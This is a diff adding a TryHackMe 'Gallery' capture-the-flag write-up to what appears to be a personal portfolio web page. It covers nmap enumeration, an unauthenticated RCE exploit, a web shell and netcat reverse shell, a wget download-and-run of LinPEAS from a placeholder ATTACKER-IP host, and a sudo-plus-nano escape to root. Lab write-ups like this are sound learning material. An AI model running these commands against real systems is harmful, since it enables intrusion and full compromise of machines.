@@ -135,6 +135,80 @@ ls</code></pre>
             <h3>Gallery</h3>
             <img class="hacking-feature-image" src="assets/gallery.png" alt="Gallery room graphic" />
             <a class="btn" href="https://www.notion.so/Gallery-324ca0ef4e7a80c1944fc624197091ef?source=copy_link" target="_blank" rel="noreferrer">Open Write-Up</a>
+            <details class="hacking-notes">
+              <summary class="btn ghost">Show Me The Notes</summary>
+              <div class="hacking-notes-body">
+                <h4>Gallery - TryHackMe Write-Up</h4>
+                <h5>Objective</h5>
+                <p>Compromise the target machine and escalate privileges to root.</p>
+
+                <h5>Enumeration</h5>
+                <p>I started with a full Nmap scan against the target:</p>
+                <pre><code>nmap -sC -sV -A -vv -p- 10.67.177.250</code></pre>
+                <p>The scan identified three open ports:</p>
+                <pre><code>22/tcp   SSH (OpenSSH 8.2p1)
+80/tcp   Apache Default Page
+8080/tcp Web Application (Gallery)</code></pre>
+                <p>Port 80 served the default Apache page and did not reveal anything useful, while port 8080 exposed the Simple Image Gallery System.</p>
+
+                <h5>Directory and Subdomain Enumeration</h5>
+                <p>I used <code>gobuster</code> and <code>ffuf</code> to look for hidden content, but neither produced significant findings.</p>
+
+                <h5>Finding a Vulnerability</h5>
+                <p>Since enumeration did not provide a direct path forward, I pivoted to vulnerability research with:</p>
+                <pre><code>searchsploit Simple Image Gallery</code></pre>
+                <p>This identified <code>Simple Image Gallery 1.0 - RCE (Unauthenticated)</code>, matching ExploitDB entry <code>50214</code>.</p>
+                <p>The key takeaway was that the application allowed remote code execution without authentication.</p>
+
+                <h5>Exploit Execution</h5>
+                <p>After running the exploit script, I gained a web shell. The uploaded shell was accessible from the uploads directory as a PHP file.</p>
+
+                <h5>Command Execution</h5>
+                <p>I verified access by executing commands such as:</p>
+                <pre><code>ls
+pwd</code></pre>
+                <p>An important behavior here was that commands needed to be lowercase to execute correctly.</p>
+
+                <h5>Reverse Shell</h5>
+                <p>To move from the web shell into a proper interactive session, I used Burp Suite to intercept the request and inject a reverse shell payload.</p>
+                <p>On the attacking machine, I prepared a listener:</p>
+                <pre><code>nc -lvnp 4444</code></pre>
+                <p>This returned a shell as <code>www-data@ip-10-67-177-252</code>.</p>
+
+                <h5>Privilege Escalation Enumeration</h5>
+                <p>Next I transferred LinPEAS to the target. On the attacking machine I hosted the file with:</p>
+                <pre><code>python3 -m http.server 8000</code></pre>
+                <p>On the target I downloaded and executed it with:</p>
+                <pre><code>wget http://ATTACKER-IP:8000/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh</code></pre>
+                <p>LinPEAS revealed the user <code>mike</code> and highlighted <code>sudo -l</code> as an important escalation path.</p>
+
+                <h5>Sudo Permissions</h5>
+                <p>Running:</p>
+                <pre><code>sudo -l</code></pre>
+                <p>returned:</p>
+                <pre><code>(ALL) NOPASSWD: /bin/bash /opt/rootkit.sh</code></pre>
+
+                <h5>Privilege Escalation to Root</h5>
+                <p>I executed the allowed script with:</p>
+                <pre><code>sudo /bin/bash /opt/rootkit.sh</code></pre>
+                <p>The script prompted for an action and offered several options. Choosing <code>read</code> opened a file in <code>nano</code>.</p>
+
+                <h5>GTFOBins Escape</h5>
+                <p>From inside nano, I used the standard escape sequence:</p>
+                <pre><code>CTRL + R
+CTRL + X
+reset; sh 1&gt;&amp;0 2&gt;&amp;0</code></pre>
+                <p>This spawned a shell with root privileges.</p>
+
+                <h5>Result</h5>
+                <p>The final shell was <code>root@ip-10-67-177-252</code>, confirming full compromise of the machine.</p>
+
+                <h5>Key Takeaways</h5>
+                <p>This box reinforced the value of full-port enumeration, vulnerability research when standard enumeration stalls, reliable file transfer, and checking <code>sudo -l</code> for escalation paths. The decisive step was recognizing that an editor escape through nano could be turned into a root shell.</p>
+              </div>
+            </details>
           </article>
 
           <article class="card hacking-note-card hacking-feature-card">
